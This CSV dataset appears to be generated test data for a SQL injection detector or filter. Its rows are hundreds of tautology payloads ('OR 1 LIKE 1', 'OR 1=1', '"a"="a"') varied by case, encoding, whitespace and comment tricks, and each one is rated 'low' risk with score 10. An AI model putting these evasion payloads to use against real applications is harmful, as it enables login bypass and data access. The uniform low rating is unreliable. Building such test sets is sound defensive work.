Query,Risk Level,Expected Score
'+OR+1+LIKE+1;--,low,10
'	or	1	like	1;--,low,10
'/**/OR/**/1/**/LIKE/**/1;--,low,10
' OR 1 like 1;--,low,10
' OR 1 LIKE 1;-- -- comment,low,10
'/**/or/**/1/**/like/**/1;#,low,10
' OR 1 LIKE 1;-- # gTRiIOMCQp,low,10
' oR 1 lIke 1;--,low,10
'	or	1	like	1;--	--	FzKfiLUb,low,10
' or 1 like 1;-- -- comment,low,10
' or 1 like 1;-- # MySQL comment,low,10
'/**/or/**/1/**/like/**/1;-- # PbgyhoTvEH,low,10
' or 1 like 1;-- -- TvWxFxwfjJ,low,10
' or 1 like 1;#,low,10
' or 1 like 1;-- -- HsLkny,low,10
'	Or	1	LiKE	1;--,low,10
' oR 1 LiKE 1;--,low,10
' OR 1 LIKE 1;-- # BYeaYkinDJ,low,10
' OR 1 LIKE 1;-- -- COMMENT,low,10
'	or	1	like	1;-- # MySQL comment,low,10
' Or 1 Like 1;--,low,10
'	or	1	like	1;# # qDsAkoddH,low,10
'/**/Or/**/1/**/Like/**/1;--,low,10
'+or+1+like+1;-- # MySQL comment,low,10
'+or+1+like+1;-- /* test */,low,10
""" || 1 LIKE 1;--",low,10
'  or  1  like  1;--,low,10
'	||	1	LIKE	1;--,low,10
'%20or%201%20like%201;-- # gDVSNtireN,low,10
'/**/or/**/1/**/like/**/1;-- -- comment,low,10
'%20or%201%20like%201;-- /* test */,low,10
' or 1 like 1;-- -- HYYNPivJ,low,10
' or 1 like 1;# -- TmqGWAkbeR,low,10
' or 1 like 1;-- # UAlIUOvUfM,low,10
' or 1 like 1;-- -- aeiQFXLz,low,10
' or 1 like 1;-- -- YxiAEsVBOP # MySQL comment,low,10
"""	or	1	like	1;--",low,10
'%20or%201%20like%201;-- -- comment,low,10
' oR 1 liKe 1;--,low,10
'	or	1	like	1;--	#	MySQL	comment,low,10
"""+or+1+like+1;--",low,10
' or 1 like 1;-- -- NvshpELreH,low,10
'%20or%201%20like%201;--%20/*%20test%20*/,low,10
'%20or%201%20like%201;#,low,10
'+OR+1+lIKE+1;--,low,10
'/**/or/**/1/**/like/**/1;-- -- SYaHPzMIr -- comment,low,10
' or 1 like 1;-- -- fgMPvuFhOj,low,10
' or 1 like 1;-- # qeiah,low,10
' or 1 lIKE 1;-- /* test */,low,10
'+or+1+like+1;--+--+comment -- PHyjbEo,low,10
'/**/or/**/1/**/like/**/1;--%20--%20comment,low,10
""" OR 1 LIKE 1;--",low,10
' or 1 like 1;-- -- mtVozSV,low,10
' or 1 like 1;-- # QCKKIvBws,low,10
'/**/OR/**/1/**/lIke/**/1;--,low,10
' or 1 LiKe 1;-- # MySQl ComMenT,low,10
'	or	1	like	1;#,low,10
' or 1 LiKE 1;--,low,10
' OR 1 LIKE 1;-- -- STQFGMJTT,low,10
'%20or%201%20like%201;--%20#%20XODsChMa,low,10
' or 1 like 1;# # yxfBtpBHS,low,10
' or 1 like 1;-- /* test */ # MySQL comment,low,10
' or 1 like 1;-- -- HJPNMG,low,10
' OR 1 LIKE 1;-- # MYSQL COMMENT,low,10
' or 1 like 1;-- -- ZmRlEE,low,10
"""/**/or/**/1/**/like/**/1;--",low,10
' or 1 like 1;-- -- JAyGWhfAmw,low,10
' or 1 like 1;-- -- comment -- comment,low,10
' or 1 like 1;-- /* test */ -- comment,low,10
'  or  1  like  1;#,low,10
"""+or+1+like+1;-- -- comment",low,10
"""%20OR%201%20LIKE%201;--",low,10
' Or 1 liKE 1;#,low,10
'%20oR%201%20LikE%201;--,low,10
'/**/or/**/1/**/like/**/1;-- # cLIlG,low,10
' or 1 LIKe 1;-- -- commeNt,low,10
"""	or	1	like	1;-- /* test */",low,10
' or 1 like 1;-- /* test */ -- AICzBNCTJa,low,10
' or 1 like 1;-- # OAhYDiiw,low,10
' oR 1 like 1;-- # MySQL comment,low,10
"""/**/or/**/1/**/like/**/1;-- -- comment",low,10
' or 1 like 1;# # comment /* test */,low,10
' OR 1 LIKE 1;-- # GMBEJL # ZGEMG,low,10
'+or+1+like+1;--+/*+test+*/ /* test */,low,10
' or 1 like 1;-- # okZkxzMn /* test */,low,10
' OR 1 LIKE 1;-- -- DgggYeGuGP,low,10
'%20or%201%20like%201;-- -- amSIOs -- comment # yxtDUbs,low,10
'	or	1	like	1;--	/*	test	*/,low,10
'%20or%201%20like%201;--%20#%20MySQL%20comment%20/*%20test%20*/,low,10
' Or 1 lIke 1;-- # xUJwVAPH,low,10
' oR 1 like 1;--,low,10
"""	Or	1	lIkE	1;--",low,10
""" OR 1 LIKE 1;# -- comment",low,10
""" Or 1 lIkE 1;-- -- qunHsqkwG",low,10
' or 1 like 1;# -- BJtfRVLBbl,low,10
"""%20or%201%20like%201;-- -- comment",low,10
' or 1 like 1;-- /* test */ /* test */,low,10
' or 1 like 1;-- -- nzpyxopz,low,10
'%20or%201%20like%201;-- # crcWxjtrx,low,10
'%20OR%201%20LIKE%201;--	#	MySQL	comment,low,10
'+or+1+like+1;--+#+PJbRlCVTjb -- PGSGhqja,low,10
'+or+1+like+1;--+#+xrhcIs+/*+test+*/,low,10
'/**/or/**/1/**/LIKe/**/1;--,low,10
'/**/or/**/1/**/like/**/1;--+#+uvlOC,low,10
'	or	1	like	1;--/**/#/**/MySQL/**/comment,low,10
' or 1 LIkE 1;-- -- PtXZa,low,10
' OR 1 LIKE 1;#,low,10
' oR 1 LiKE 1;-- -- hQSyEka,low,10
""" or 1 like 1;-- # MySQL comment",low,10
'/**/or/**/1/**/like/**/1;--/**/--/**/jTtGPWum,low,10
' or 1 like 1;-- -- OzyyVeZeLV -- CDhDTvaXr # MySQL comment,low,10
""" or 1 like 1;# -- comment",low,10
""" oR 1 LIKE 1;-- # fDepfPMGn",low,10
'	or	1	like	1;--	--	comment	#	MySQL	comment,low,10
'%20or%201%20like%201;#%20#%20ABLoPR,low,10
'/**/OR/**/1/**/liKE/**/1;-- # SIDzZMK,low,10
"""+or+1+like+1;--/**//*/**/test/**/*/",low,10
'+or+1+like+1;--+/*+test+*/,low,10
'/**/OR/**/1/**/LIKE/**/1;--/**/#/**/RFJPHXVNF,low,10
'/**/or/**/1/**/like/**/1;-- # MySQL comment # UBzwNVFRB,low,10
'+OR+1+LIkE+1;--,low,10
'/**/OR/**/1/**/LIKE/**/1;--%20--%20CoMMENT,low,10
'	OR	1	LIKE	1;-- -- comment,low,10
'	OR	1	LIKE	1;--	#	mYsql	COMMENT,low,10
'%20Or%201%20LIkE%201;-- # eVPbjmYDsm,low,10
'	or	1	like	1;#	#	gkULN,low,10
' OR 1 LIKE 1;-- -- COMMENT -- comment,low,10
'%20or%201%20like%201;-- # MySQL comment /* test */,low,10
'/**/or/**/1/**/like/**/1;-- -- comment -- UROYtChZ,low,10
'%20or%201%20LiKE%201;--,low,10
' or 1 like 1;-- -- FJTJtbIV,low,10
' or 1 like 1;-- -- xAxFg # ygHFJuQkl,low,10
"""+or+1+like+1;-- # hABZOdet",low,10
' or 1 like 1;-- -- cwaFDLSrMl,low,10
'+or+1+like+1;--+/*+test+*/ /* test */ -- comment,low,10
' OR 1 LIKE 1;# # MySQL comment # MySQL comment,low,10
'	OR	1	LIKE	1;--	/*	test	*/,low,10
"""/**/OR/**/1/**/LIKE/**/1;--",low,10
'/**/or/**/1/**/like/**/1;--/**/--/**/comment/**/#/**/MySQL/**/comment,low,10
' or 1 like 1;-- -- AQkOOeCGF,low,10
'/**/or/**/1/**/like/**/1;-- /* test */,low,10
'	or	1	like	1;--%20/*%20test%20*/,low,10
'	OR	1	liKe	1;--,low,10
' Or 1 lIKe 1;--,low,10
'	oR	1	lIKE	1;--,low,10
""" or 1 like 1;# # KIYLskE",low,10
' or 1 like 1;# # RZqWXj /* test */,low,10
""" OR 1 lIke 1;--",low,10
'%20OR%201%20LIKe%201;-- -- uemRDBbAyA,low,10
' OR 1 LIKE 1;-- -- WWTPZZSJ,low,10
""" or 1 like 1;-- # eHXChYk # MySQL comment",low,10
' OR 1 LIKE 1;-- # BvoCNWfQU,low,10
' or 1 like 1;-- -- buwke,low,10
' or 1 like 1;-- -- dmkmeztstv,low,10
' or 1 like 1;# # CrYErY # comment,low,10
' OR 1 LIKE 1;-- -- CYRMNTG,low,10
'/**/OR/**/1/**/LIKE/**/1;-- -- LChlxiLQx,low,10
' OR 1 like 1;-- /* tEst */,low,10
' or 1 like 1;-- # WpZJvCsXx -- RIdvfR /* test */,low,10
'%20or%201%20like%201;--%20#%20zrTrtX,low,10
'/**/or/**/1/**/like/**/1;-- -- JDQxbuzF,low,10
"""/**/or/**/1/**/like/**/1;--/**/--/**/comment",low,10
'/**/or/**/1/**/like/**/1;--/**//*/**/test/**/*/,low,10
'%20OR%201%20LIKE%201;-- /* TEST */,low,10
' or 1 like 1;-- -- pQTEr # MySQL comment # LEdiaYCS,low,10
'/**/Or/**/1/**/LIKe/**/1;--,low,10
'+oR+1+LIKE+1;--+--+apwhojDr,low,10
"""/**/or/**/1/**/like/**/1;-- -- CtWhRrsni",low,10
'/**/Or/**/1/**/liKE/**/1;--,low,10
""" or 1 likE 1;-- # MySQL comment",low,10
'%20OR%201%20LIKE%201;--/**//*/**/TEST/**/*/,low,10
'/**/||/**/1/**/LIKE/**/1;--/**/--/**/COMMENT,low,10
' Or 1 likE 1;# # Pupqd /* test */,low,10
""" or 1 like 1;# /* test */",low,10
'/**/OR/**/1/**/LIKE/**/1;# # SADXSTPQKX,low,10
'%20or%201%20like%201;-- # gSClalXHC,low,10
' or 1 like 1;-- # qfgizgifts,low,10
""" or 1 like 1;-- # hHMKRFcLv -- xFmfQEQyNX",low,10
' OR 1 LIKE 1;-- # JAZTPJ,low,10
'/**/or/**/1/**/like/**/1;--	/*	test	*/,low,10
'/**/or/**/1/**/like/**/1;-- # MySQL comment,low,10
'%20OR%201%20LIKE%201;--%20/*%20test%20*/,low,10
' or 1 like 1;-- # mysql comment,low,10
'	OR	1	LIKE	1;#	#	MySQL	comment # WKTHyL,low,10
'/**/OR/**/1/**/LIKE/**/1;#,low,10
' or 1 like 1;-- -- comment # xdDqVzm,low,10
'+or+1+like+1;--+/*+test+*/+#+yCyMXjy,low,10
"""	or	1	like	1;#",low,10
' || 1 LIKE 1;#,low,10
' or 1 like 1;-- # thDVRvsSPc,low,10
'/**/or/**/1/**/like/**/1;--/**/--/**/nQDkAgj,low,10
' OR 1 LiKe 1;-- -- comment,low,10
'/**/or/**/1/**/like/**/1;#/**/#/**/CVRjNjtT,low,10
' or 1 like 1;-- -- comment -- mcwWdoDc,low,10
'  or  1  like  1;--  --  nqhmjt,low,10
'/**/or/**/1/**/like/**/1;--/**/--/**/PSkSM,low,10
""" OR 1 lIke 1;-- -- gVrqAsGz",low,10
' OR 1 lIkE 1;--,low,10
""" OR 1 LIKE 1;-- -- nFAgYQa",low,10
"""+or+1+Like+1;--",low,10
'%20OR%201%20LIKE%201;-- # mLhNAN,low,10
'%20||%201%20LIKE%201;--,low,10
' or 1 like 1;-- -- tzbqzc,low,10
""" OR 1 LIKE 1;#",low,10
""" or 1 like 1;-- -- TNJypJSgjh",low,10
' oR 1 LIKE 1;#,low,10
"""+or+1+like+1;-- # JEIJkVZ # jgjggKU",low,10
'	OR	1	Like	1;--,low,10
'%20or%201%20like%201;--%20--%20xUiDtlVU%20--%20comment,low,10
' or 1 like 1;-- /* test */ -- qWbeRo,low,10
' or 1 like 1;# # KPQRQvFkC,low,10
' or 1 like 1;# # PxYKiOz /* test */,low,10
' OR 1 LIKE 1;-- -- HcwXSlqWwG # HvpJg,low,10
'+or+1+like+1;# # comment # MySQL comment,low,10
'/**/OR/**/1/**/LikE/**/1;--,low,10
' OR 1 liKe 1;-- -- QSfQKV,low,10
' or 1 like 1;-- -- asPnj,low,10
' or 1 like 1;-- -- comment -- OPnAMb,low,10
' OR 1 LiKE 1;-- -- comment /* test */,low,10
' Or 1 lIKe 1;-- -- XpWqvnFYOV # wufALA,low,10
'+oR+1+LiKe+1;--,low,10
' or 1 like 1;# # MySQL comment -- jmkphVCtL,low,10
"""+OR+1+LIKE+1;# -- comment",low,10
'/**/OR/**/1/**/LIKE/**/1;--/**//*/**/TEST/**/*/,low,10
'+or+1+like+1;--+--+comment,low,10
'/**/or/**/1/**/like/**/1;#/**/#/**/comment,low,10
'+or+1+like+1;--+#+Occsdg,low,10
' or 1 like 1;# /* test */ # BCyVXmWQYN,low,10
""" or 1 like 1;-- # mUfdGQQf",low,10
'/**/or/**/1/**/like/**/1;--/**/#/**/MySQL/**/comment/**/#/**/MySQL/**/comment,low,10
'	OR	1	LIKE	1;--	#	MJOQEN	#	MYSQL	COMMENT # gTqplNc,low,10
'+or+1+like+1;-- # kCihYjvE,low,10
""" OR 1=1 --",low,10
"""	OR	1=1	--",low,10
""" || 1=1 --",low,10
"""  OR  1=1  --",low,10
"""/**/OR/**/1=1/**/--",low,10
""" OR 1=1 -- # MySQL comment",low,10
"""%20OR%201=1%20--",low,10
""" oR 1=1 -- # BwoAd",low,10
""" OR 1=1 -- -- NcEhApaXej -- UJEFnvC",low,10
"""+OR+1=1+-- -- exYsmrZPzm",low,10
"""	or	1=1	--",low,10
""" oR 1=1 --",low,10
"""+OR+1=1+--+--+comment",low,10
"""+OR+1=1+#",low,10
""" OR 1=1 -- -- comment",low,10
""" OR 1=1 -- # DosNMhrlcq",low,10
""" OR 1=1 -- /* test */",low,10
""" or 1=1 --",low,10
""" OR 1=1 -- -- pPytJcrTJB",low,10
"""%20or%201=1%20--",low,10
"""+OR+1=1+--",low,10
""" OR 1=1 -- -- PKlTZEy",low,10
""" OR 1=1 #",low,10
""" OR 1=1 # -- comment /* test */",low,10
""" OR 1=1 -- # hSktLeObc",low,10
""" || 1=1 -- # EBMrsEXs",low,10
""" OR 1=1 # # comment",low,10
"""+||+1=1+--",low,10
""" or 1=1 -- # mysql comment",low,10
"""%20OR%201=1%20-- # MySQL comment",low,10
""" or 1=1 -- -- COMMENT",low,10
""" OR 1=1 -- -- pMrmYpJcK",low,10
""" OR 1=1 -- # GBjuq",low,10
""" OR 1=1 -- # zgDDCA",low,10
""" OR 1=1 -- # fTebRhh # MySQL comment",low,10
""" || 1=1 -- -- ueSXBEXkyj",low,10
""" Or 1=1 -- /* test */ /* test */",low,10
""" || 1=1 -- # cczYE",low,10
""" or 1=1 -- # AnEmYSIhqN",low,10
"""%20OR%201=1%20-- -- comment",low,10
""" OR 1=1 # # zTAeOW",low,10
""" OR 1=1 -- -- pYaMFtH",low,10
""" Or 1=1 --",low,10
""" OR 1=1 -- # wbycc # MySQL comment",low,10
"""%20OR%201=1%20#",low,10
""" OR 1=1 -- -- cOMment # MySQL comment",low,10
""" OR 1=1 -- -- PxgtkSOdY",low,10
""" OR 1=1 -- # zaFCla",low,10
""" OR 1=1 -- -- hsmrHKZO",low,10
"""%20%20or%20%201=1%20%20--",low,10
""" or 1=1 #",low,10
"""+OR+1=1+--+#+cPvrtLzfkC+#+AEzXGPYvbt",low,10
""" OR 1=1 -- # MySQL comment -- wnpobczz",low,10
""" or 1=1 -- /* test */ -- WWHMHyv",low,10
"""+OR+1=1+--+#+vlvgqfhR",low,10
""" OR 1=1 -- -- jqJBYIHK",low,10
"""+||+1=1+--+#+MySQL+comment",low,10
""" OR 1=1 -- /* TEST */",low,10
"""/**/OR/**/1=1/**/-- /* test */",low,10
""" OR 1=1 -- -- gbiYy",low,10
""" OR 1=1 -- # VzPmOqjNP",low,10
"""/**/OR/**/1=1/**/--/**//*/**/test/**/*/",low,10
""" oR 1=1 # /* test */",low,10
""" or 1=1 -- # LepckJJU",low,10
""" OR 1=1 -- # ZXweO -- EojlcOfWw",low,10
"""+OR+1=1+-- -- wDRRASebg",low,10
""" Or 1=1 #",low,10
"""	OR	1=1	--	#	MySQL	comment",low,10
"""+OR+1=1+--+/*+test+*/",low,10
""" OR 1=1 -- # GmNcO",low,10
""" OR 1=1 -- # NamDZCSTW",low,10
"""/**/or/**/1=1/**/--",low,10
""" || 1=1 -- -- SeMHqxYPmc",low,10
""" OR 1=1 -- # MySQL comment -- VislpfPAJ",low,10
""" OR 1=1 -- # EuHqlZFFu",low,10
""" OR 1=1 # -- yeRyN",low,10
""" or 1=1 -- -- comment",low,10
"""%20OR%201=1%20--%20--%20comment",low,10
""" or 1=1 # # wfsczxcv",low,10
""" Or 1=1 -- -- dRFEdCoI",low,10
""" OR 1=1 -- -- WncjmuzVT",low,10
""" oR 1=1 -- /* test */",low,10
""" OR 1=1 -- # MysQl cOMmEnt",low,10
""" OR 1=1 -- -- TxVhNd",low,10
"""/**/OR/**/1=1/**/-- # EoqPjzBp",low,10
""" OR 1=1 -- -- BBeXxbnN",low,10
""" OR 1=1 -- -- UPzyQUPmFp # MySQL comment",low,10
""" OR 1=1 -- -- zUFvKZv",low,10
"""%20OR%201=1%20--%20#%20MySQL%20comment%20--%20comment",low,10
""" OR 1=1 -- -- VIiApDz",low,10
""" OR 1=1 -- -- COMMENT",low,10
""" or 1=1 -- # xxLBxT",low,10
""" || 1=1 -- -- COMMENT",low,10
"""+OR+1=1+#+#+QbxiN",low,10
"""+OR+1=1+--+#+MYSQL+COMMENT",low,10
"""  or  1=1  --  #  mysql  comment",low,10
""" || 1=1 -- # jfasXwR",low,10
"""	||	1=1	--	#	DGpFAhBAbf /* test */",low,10
"""/**/OR/**/1=1/**/--/**/#/**/KAGsux/**/--/**/comment/**/#/**/nipnO",low,10
""" OR 1=1 # # MySQL comment",low,10
"""	OR	1=1	--	--	lSEZhwKJ",low,10
"""%20or%201=1%20--%20--%20comment",low,10
"""	OR	1=1	--/**//*/**/TEST/**/*/",low,10
""" or 1=1 -- # skwxdgb",low,10
"""%20||%201=1%20--%20--%20OQiir",low,10
"""+OR+1=1+--+#+EcXkdo",low,10
"""	OR	1=1	#",low,10
"""+OR+1=1+# # vfhcMSom",low,10
"""	OR	1=1	--	--	comment",low,10
"""+oR+1=1+--+#+ybeCl",low,10
""" OR 1=1 -- # oEmeD # MySQL comment",low,10
"""%20||%201=1%20--%20#%20MySQL%20comment",low,10
"""/**/OR/**/1=1/**/#/**//*/**/test/**/*/",low,10
""" oR 1=1 -- # rpHHM",low,10
"""/**/or/**/1=1/**/# -- COMMENT",low,10
"""+||+1=1+--+/*+TEST+*/",low,10
""" OR 1=1 -- # MySQL comment /* test */",low,10
"""	||	1=1	# # JHbngmz",low,10
"""%20or%201=1%20-- -- comment",low,10
""" or 1=1 # # mYsql COMMENT",low,10
"""%20Or%201=1%20-- # ECwXhwQoFb",low,10
""" or 1=1 -- /* TesT */",low,10
"""+OR+1=1+--+#+aynLLdI",low,10
""" || 1=1 -- # MySQL comment",low,10
"""	OR	1=1	-- -- comment",low,10
""" OR 1=1 -- # MySQL comment # suVBBgz /* test */ /* test */",low,10
""" || 1=1 -- /* test */",low,10
""" or 1=1 -- # MySQL comment",low,10
"""/**/OR/**/1=1/**/#	#	MySQL	comment",low,10
""" Or 1=1 -- # mYSQL ComMENT",low,10
"""+OR+1=1+--+/*+test+*/ # cgFyPuIC # MySQL comment",low,10
"""+OR+1=1+--+--+OUkIkG # UZMwJCVHr",low,10
"""+or+1=1+#",low,10
"""/**/OR/**/1=1/**/--/**/#/**/BTQaGhLQ/**/#/**/MdtpMmYpI",low,10
""" or 1=1 -- /* tEsT */",low,10
"""%20||%201=1%20-- # MySQL comment",low,10
"""	or	1=1	-- -- xQzwSHn",low,10
""" OR 1=1 -- -- BCPIGLBNC",low,10
""" OR 1=1 -- # bXBcTjQSRa",low,10
""" OR 1=1 -- /* TEST */ -- comment",low,10
"""/**/OR/**/1=1/**/--/**/--/**/comment # MySQL comment",low,10
"""/**/OR/**/1=1/**/-- # MySQL comment",low,10
"""/**/Or/**/1=1/**/--",low,10
"""	Or	1=1	--",low,10
"""/**/oR/**/1=1/**/#",low,10
"""/**/||/**/1=1/**/--/**/--/**/sAEbBPam # RisVvAiV",low,10
"""%20||%201=1%20--",low,10
""" || 1=1 -- -- FKLJFHMB # QBLXEBAE",low,10
"""/**/OR/**/1=1/**/-- # cqLTenlsNT",low,10
""" || 1=1 -- -- mhbIi",low,10
"""+Or+1=1+--",low,10
"""++OR++1=1++--++#++MySQL++comment",low,10
""" OR 1=1 -- /* test */ # MySQL comment",low,10
"""%20OR%201=1%20# # BWUcPyh # MySQL comment",low,10
"""%20or%201=1%20-- # vvsespwzqm",low,10
"""/**/OR/**/1=1/**/--/**/#/**/uyYzQos	--	comment",low,10
""" OR 1=1 -- # HQRxew",low,10
""" or 1=1 -- -- comment # MySQL comment",low,10
"""%20Or%201=1%20--",low,10
""" or 1=1 -- /* test */",low,10
"""/**/OR/**/1=1/**/#/**/#/**/comment",low,10
""" || 1=1 #",low,10
"""+or+1=1+-- # ypyHoGZWty",low,10
"""/**/OR/**/1=1/**/--/**/#/**/BeYAggeDtY/**//*/**/test/**/*/",low,10
""" or 1=1 -- /* tEst */",low,10
""" OR 1=1 -- # KCXPOYOKPM -- COMMENT",low,10
"""%20OR%201=1%20--/**/#/**/MySQL/**/comment/**/--/**/comment",low,10
"""%20or%201=1%20-- /* test */ # MySQL comment",low,10
""" or 1=1 -- -- comment -- pgehhqr",low,10
"""%20OR%201=1%20--%20#%20KVRAYXlo",low,10
"""	or	1=1	-- # mYsql COMMENT -- comment",low,10
""" or 1=1 -- # DlMddyfth",low,10
""" Or 1=1 -- # sQLBgeLP /* tEst */",low,10
"""/**/OR/**/1=1/**/#",low,10
"""/**/Or/**/1=1/**/--/**/--/**/comment",low,10
""" or 1=1 # -- KXxwcUX",low,10
""" or 1=1 -- -- oxqmc",low,10
"""	OR	1=1	--	/*	test	*/",low,10
"""	||	1=1	--	#	MySQL	comment # MySQL comment",low,10
"""+OR+1=1+--+/*+test+*/ -- comment",low,10
"""%20OR%201=1%20--/**/--/**/EGDki",low,10
"""+or+1=1+--+/*+test+*/",low,10
"""+OR+1=1+--/**/--/**/COMMENT",low,10
"""	||	1=1	--	/*	test	*/",low,10
""" or 1=1 -- /* test */ -- comment",low,10
"""%20OR%201=1%20-- /* test */",low,10
"""	or	1=1	--	#	scbeds -- odjkkei",low,10
"""+OR+1=1+-- -- comment",low,10
"""+or+1=1+--+/*+TEST+*/",low,10
"""	||	1=1	--",low,10
""" OR 1=1 -- -- uZNrPaoyy /* test */ # kqkwDGhZm",low,10
""" oR 1=1 # /* teST */",low,10
""" or 1=1 # # MySQL comment",low,10
"""/**/or/**/1=1/**/--/**/--/**/comment",low,10
"""	OR	1=1	-- -- ypLiIWm # MySQL comment",low,10
"""	Or	1=1	--	--	YRJEQFS",low,10
"""%20OR%201=1%20--%20/*%20teST%20*/",low,10
""" or 1=1 -- -- gwrhqf",low,10
""" OR 1=1 -- # MySQL comment -- HZrCyAF",low,10
"""++or++1=1++--+--+tWBgP",low,10
""" || 1=1 -- -- comment",low,10
"""+or+1=1+-- -- zknjswt",low,10
""" || 1=1 # # MySQL comment",low,10
""" || 1=1 # # UcXWQgL /* test */",low,10
"""/**/OR/**/1=1/**/--%20--%20kgEbkNBLZ",low,10
"""%20or%201=1%20--%20--%20ESQuoN",low,10
"""+or+1=1+--",low,10
""" OR 1=1 -- # MYSQL COMMENT",low,10
"""/**/OR/**/1=1/**/--/**/--/**/PWudhJahru",low,10
""" OR 1=1 -- # ggUfvGeErh",low,10
"""+||+1=1+-- # KvDAiRk",low,10
""" OR 1=1 -- # ZJZIP -- Qxjjad",low,10
"""%20||%201=1%20#",low,10
""" OR 1=1 -- /* test */ # MySQL comment /* test */",low,10
"""/**/OR/**/1=1/**/-- -- TyRVW",low,10
""" OR 1=1 -- -- comment # MySQL comment -- gwnSGECVHH",low,10
"""+OR+1=1+--+#+HRKXMcJ # IFLZKw",low,10
""" or 1=1 -- # kzpbkr",low,10
""" OR 1=1 -- -- IIFMJ",low,10
""" OR 1=1 -- # MySQL comment -- xrSDYRSx",low,10
"""+OR+1=1+-- # UqyJt -- MtOpzD",low,10
""" OR 1=1 -- # sIqDgsioL",low,10
""" || 1=1 -- /* test */ /* test */ # MySQL comment",low,10
"""%20or%201=1%20-- /* test */",low,10
"""/**/OR/**/1=1/**/-- # gYCGnu",low,10
""" OR 1=1 -- # OHGcXBhEM",low,10
""" or 1=1 -- /* TEst */",low,10
""" OR 1=1 -- -- CiKqHehL",low,10
"""	OR	1=1	-- # MySQL comment",low,10
""" OR 1=1 # -- eOeAETVr",low,10
"""+||+1=1+--+/*+test+*/",low,10
"""	or	1=1	--	#	MySQL	comment",low,10
""" OR 1=1 # # JhRNBl",low,10
"""/**/or/**/1=1/**/--/**//*/**/test/**/*/",low,10
""" || 1=1 -- /* teSt */",low,10
""" OR 1=1 -- # FWJAJBRDH -- KZLFZHXTG",low,10
""" OR 1=1 -- /* test */ -- xPaIE",low,10
"""+OR+1=1+# /* test */",low,10
""" OR 1=1 -- # gCACHPSyY -- nIBps",low,10
"""+OR+1=1+--+#+MySQL+comment",low,10
"""+OR+1=1+--+--+dOjKq",low,10
""" oR 1=1 -- # MySQL comment",low,10
"""%20OR%201=1%20# -- comment",low,10
"""  or  1=1  # # MySQL comment",low,10
"""+OR+1=1+-- /* test */",low,10
"""  ||  1=1  --  --  LlnJCGdN  #  MySQL  comment",low,10
"""/**/OR/**/1=1/**/# /* test */",low,10
""" or 1=1 -- # VbHCPAV",low,10
"""%20oR%201=1%20-- /* test */",low,10
"""/**//**/OR/**//**/1=1/**//**/--/**//**/#/**//**/MySQL/**//**/comment",low,10
""" OR ""a""=""a""",low,10
"""+or+""a""=""a""",low,10
""" || ""a""=""a"" # MySQL comment",low,10
"""%20||%20""a""=""a""",low,10
""" OR ""a""=""a"" -- uppVSGW",low,10
"""/**/OR/**/""a""=""a""/**/--/**/comment",low,10
""" OR ""a""=""a"" # hXjqtWIMo",low,10
""" or ""A""=""A""",low,10
"""+OR+""a""=""a""",low,10
"""+OR+""a""=""a""+#+MySQL+comment",low,10
""" or ""A""=""a""",low,10
"""	OR	""a""=""a""",low,10
""" OR ""a""=""a"" /* test */",low,10
"""%20OR%20""a""=""a""",low,10
""" || ""a""=""a"" -- bAaxjTFcD",low,10
""" OR ""a""=""a"" -- MTeOltNgL",low,10
""" OR ""a""=""a"" -- comment",low,10
""" Or ""a""=""A""",low,10
"""%20or%20""A""=""a""",low,10
""" OR ""a""=""a"" -- WGwbxLwin",low,10
""" or ""a""=""a""",low,10
""" OR ""a""=""a"" # hWTVIP",low,10
""" OR ""a""=""a"" # jJsSiW",low,10
""" OR ""a""=""a"" -- PNCGQ # lBIrQH",low,10
""" || ""a""=""a""",low,10
"""/**/OR/**/""a""=""a""",low,10
"""	or	""a""=""a""",low,10
""" OR ""a""=""a"" # MySQL comment -- sTZNi",low,10
""" OR ""A""=""A"" -- comment",low,10
"""%20OR%20""a""=""a"" /* test */ # MySQL comment",low,10
""" OR ""a""=""a"" -- xeItf",low,10
"""+OR+""a""=""a""+--+MMZkXaxE",low,10
"""+OR+""A""=""A""",low,10
"""+||+""a""=""a""",low,10
""" OR ""a""=""a"" # MySQL comment # MFmxu",low,10
""" OR ""a""=""a"" # MySQL comment",low,10
""" OR ""A""=""A""",low,10
""" OR ""a""=""a"" -- fYJBiJGZed -- comment",low,10
"""+OR+""a""=""a""+#+yhRHDXCt+--+comment",low,10
"""%20OR%20""a""=""a"" -- comment",low,10
""" OR ""a""=""a"" # vVGSG",low,10
"""/**/OR/**/""A""=""A""",low,10
"""%20OR%20""a""=""a""%20/*%20test%20*/",low,10
"""	OR	""a""=""a"" -- ggcILuMhY",low,10
""" OR ""a""=""a"" # arbFcFbrn",low,10
""" oR ""a""=""A"" -- vLxae",low,10
"""/**/||/**/""a""=""a""",low,10
""" || ""A""=""a""",low,10
""" or ""A""=""A"" # MSUAzjwY",low,10
